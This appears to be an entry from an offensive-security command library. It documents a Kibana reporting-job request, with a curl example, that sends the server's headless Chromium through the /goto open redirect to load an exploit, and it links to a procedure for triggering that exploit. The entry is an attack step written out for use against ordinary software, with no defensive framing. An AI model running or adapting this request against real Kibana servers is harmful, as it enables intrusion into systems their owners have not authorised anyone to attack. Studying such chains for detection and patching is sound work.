---
data: >-
  POST /.reporting-2021-04-18/_doc { "jobtype" : "printable_pdf", "relativeUrl":
  "/goto/[short URL]#/edit/...", "browser_type": "chromium" }
tags:
  - kibana
  - reporting
type: command
output: 'Job created with status ''pending'', triggers Chromium load'
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:37.119Z'
id: 4706ac4c-416e-4563-ada3-9a11d90231ca
verified: false
validated: true
submitted: true
---
# post-reporting-job-pdf

## Command

```bash
POST /.reporting-2021-04-18/_doc { "jobtype" : "printable_pdf", "relativeUrl": "/goto/[short URL]#/edit/...", "browser_type": "chromium" }
```

## Description

Creates a new PDF reporting job in Kibana that targets the /goto endpoint, triggering the open redirect and Chromium exploit load.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| jobtype | printable_pdf for browser rendering | Yes |
| relativeUrl | /goto/[short URL] to trigger redirect | Yes |
| browser_type | chromium to use vulnerable browser | Yes |

## Examples

### Basic Usage

```bash
curl -X POST "localhost:9200/.reporting-2021-04-18/_doc" -H "Authorization: [auth]" -d '{ "jobtype" : "printable_pdf", "relativeUrl": "/goto/test#/edit/...", "browser_type": "chromium" }'
```

## Expected Output

JSON response with job ID and 'pending' status; background process starts Chromium.

## Related

- [[commands/get-reporting-search]]
- [[procedures/Create-Reporting-Job-to-Trigger-Exploit-via-Redirect]]
